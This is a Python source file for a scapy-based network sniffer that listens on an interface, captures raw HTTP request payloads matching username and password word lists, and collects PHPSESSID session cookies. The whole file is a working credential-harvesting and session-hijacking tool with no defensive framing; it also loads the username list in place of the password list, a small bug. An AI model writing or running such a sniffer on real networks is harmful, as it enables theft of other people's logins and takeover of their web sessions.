from scapy.all import *
from scapy_http import http
from threading import Thread, Event
from general import *


class Sniffer(Thread):

    def __init__(self, interface):
        super().__init__()

        self.daemon = True
        self.socket = None
        self.interface = interface
        self.stop_sniffer = Event()
        self.log = list()
        self.list_cookie = set()

        self.db_username = file_to_list("db/db_username.txt")
        self.db_password = file_to_list("db/db_username.txt")



    def run(self):
        try:
            self.socket = conf.L2listen(type=ETH_P_ALL, iface=self.interface )
            sniff(opened_socket=self.socket, prn=self.process_sniffer, stop_filter=self.should_stop_sniffer)
        except:
            self.log.append("Sniffing Error please check interface or user permision")

    def process_sniffer(self, packet):
        if packet.haslayer(http.HTTPRequest):
            self.get_credential(packet)
            self.get_session(packet)

    def get_credential(self, packet):

        if packet.haslayer(Raw):
            load = packet[Raw].load
            for username in self.db_username:
                if username in str(load):
                    self.log.append(load)
                    return
            for password in self.db_password:
                if password in str(load):
                    self.log.append(load)
                    return

    def get_session(self, packet):
        xs = packet[http.HTTPRequest].show(dump=True)
        for x in str(xs).splitlines():
            if x.__contains__("PHPSESSID"):
                ys = x.split("'")
                for y in ys:
                    if y.__contains__("PHPSESSID"):
                        zs = y.split(";")
                        for z in zs:
                            cek = z.strip()
                            cek = cek.split("=")
                            if len(cek[1]) < 32:
                                self.list_cookie.add(z)
                        return

    def join(self, timeout=None):
        self.stop_sniffer.set()
        super().join(timeout)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def return_output(self):
        output = self.log
        return output

    def return_output_cookie(self):
        output = self.list_cookie
        return output
